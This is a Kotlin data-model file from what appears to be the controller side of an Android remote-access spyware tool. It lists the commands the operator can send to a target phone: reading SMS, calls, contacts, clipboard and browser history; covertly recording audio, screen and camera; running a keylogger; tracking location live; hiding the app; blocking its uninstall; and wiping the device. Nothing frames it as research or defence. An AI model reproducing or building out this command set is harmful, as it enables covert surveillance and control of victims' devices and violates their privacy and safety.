package com.abuzahra.admin.data.model

/**
 * Predefined commands organized by category.
 * Command keys MUST match the server's COMMAND_REGISTRY cmd values exactly.
 */
object CommandDefinitions {

    data class CommandDef(
        val key: String,
        val name: String,
        val icon: Int? = null
    )

    enum class Category(val key: String, val displayName: String) {
        DATA("data", "البيانات"),
        CONTROL("control", "التحكم"),
        FILES("files", "الملفات"),
        SECURITY("security", "الأمان"),
        MONITOR("monitor", "المراقبة")
    }

    val commandsByCategory: Map<Category, List<CommandDef>> = mapOf(
        Category.DATA to listOf(
            CommandDef("get_sms", "الرسائل النصية"),
            CommandDef("get_calls", "سجل المكالمات"),
            CommandDef("get_contacts", "جهات الاتصال"),
            CommandDef("get_location", "تحديد الموقع"),
            CommandDef("get_notifications", "الإشعارات"),
            CommandDef("get_apps", "التطبيقات المثبتة"),
            CommandDef("get_info", "معلومات الجهاز"),
            CommandDef("get_battery", "معلومات البطارية"),
            CommandDef("get_gallery", "المعرض والصور"),
            CommandDef("get_clipboard", "الحافظة"),
            CommandDef("get_wifi_info", "معلومات الواي فاي"),
            CommandDef("get_network_info", "معلومات الشبكة"),
            CommandDef("get_sim_info", "معلومات الشريحة"),
            CommandDef("get_storage_info", "معلومات التخزين"),
            CommandDef("get_running_apps", "التطبيقات العاملة"),
            CommandDef("get_calendar", "التقويم"),
            CommandDef("get_browser_history", "سجل المتصفح")
        ),
        Category.CONTROL to listOf(
            CommandDef("ping", "فحص الاتصال"),
            CommandDef("vibrate", "اهتزاز"),
            CommandDef("ring", "رنين الجهاز"),
            CommandDef("screenshot", "لقطة شاشة"),
            CommandDef("front_camera", "الكاميرا الأمامية"),
            CommandDef("back_camera", "الكاميرا الخلفية"),
            CommandDef("record_audio", "تسجيل صوتي"),
            CommandDef("record_screen", "تسجيل الشاشة"),
            CommandDef("lock_phone", "قفل الجهاز"),
            CommandDef("reboot", "إعادة تشغيل"),
            CommandDef("shutdown", "إيقاف التشغيل"),
            CommandDef("set_volume", "ضبط الصوت"),
            CommandDef("set_brightness", "ضبط السطوع"),
            CommandDef("enable_wifi", "تشغيل الواي فاي"),
            CommandDef("disable_wifi", "تعطيل الواي فاي"),
            CommandDef("enable_bluetooth", "تشغيل البلوتوث"),
            CommandDef("disable_bluetooth", "تعطيل البلوتوث"),
            CommandDef("enable_mobile_data", "تشغيل بيانات الجوال"),
            CommandDef("disable_mobile_data", "تعطيل بيانات الجوال"),
            CommandDef("enable_hotspot", "تشغيل نقطة الاتصال"),
            CommandDef("disable_hotspot", "تعطيل نقطة الاتصال"),
            CommandDef("torch_on", "تشغيل الكشاف"),
            CommandDef("torch_off", "إيقاف الكشاف"),
            CommandDef("play_sound", "تشغيل صوت"),
            CommandDef("speak_text", "نطق نص"),
            CommandDef("show_notification", "إظهار إشعار"),
            CommandDef("open_url", "فتح رابط"),
            CommandDef("send_sms", "إرسال رسالة"),
            CommandDef("make_call", "إجراء مكالمة")
        ),
        Category.FILES to listOf(
            CommandDef("list_files", "عرض الملفات"),
            CommandDef("get_file", "تحميل ملف"),
            CommandDef("delete_file", "حذف ملف"),
            CommandDef("rename_file", "إعادة تسمية"),
            CommandDef("copy_file", "نسخ ملف"),
            CommandDef("move_file", "نقل ملف"),
            CommandDef("create_folder", "إنشاء مجلد"),
            CommandDef("search_files", "بحث في الملفات"),
            CommandDef("get_folder_size", "حجم المجلد"),
            CommandDef("zip_files", "ضغط ملفات"),
            CommandDef("recent_files", "الملفات الأخيرة"),
            CommandDef("file_info", "معلومات الملف")
        ),
        Category.SECURITY to listOf(
            CommandDef("wipe_data", "مسح البيانات"),
            CommandDef("factory_reset", "إعادة ضبط المصنع"),
            CommandDef("show_app", "إظهار تطبيق"),
            CommandDef("hide_app", "إخفاء تطبيق"),
            CommandDef("change_passcode", "تغيير رمز القفل"),
            CommandDef("enable_biometric", "تشغيل البصمة"),
            CommandDef("disable_biometric", "تعطيل البصمة"),
            CommandDef("anti_uninstall_on", "حماية من الحذف"),
            CommandDef("anti_uninstall_off", "إلغاء الحماية"),
            CommandDef("device_admin_status", "حالة المشرف")
        ),
        Category.MONITOR to listOf(
            CommandDef("keylogger_start", "بدء تسجيل المفاتيح"),
            CommandDef("keylogger_stop", "إيقاف تسجيل المفاتيح"),
            CommandDef("get_keylogger", "سجل المفاتيح"),
            CommandDef("screen_record_start", "بدء تسجيل الشاشة"),
            CommandDef("screen_record_stop", "إيقاف تسجيل الشاشة"),
            CommandDef("location_live", "تتبع الموقع المباشر"),
            CommandDef("location_stop", "إيقاف التتبع"),
            CommandDef("clipboard_monitor_start", "مراقبة الحافظة"),
            CommandDef("clipboard_monitor_stop", "إيقاف مراقبة الحافظة"),
            CommandDef("get_clipboard_log", "سجل الحافظة"),
            CommandDef("wifi_monitor_start", "مراقبة الواي فاي"),
            CommandDef("wifi_monitor_stop", "إيقاف مراقبة الواي فاي"),
            CommandDef("app_monitor_start", "مراقبة التطبيقات"),
            CommandDef("app_monitor_stop", "إيقاف مراقبة التطبيقات"),
            CommandDef("get_app_log", "سجل التطبيقات"),
            CommandDef("sms_monitor", "مراقبة الرسائل"),
            CommandDef("call_monitor", "مراقبة المكالمات")
        )
    )
}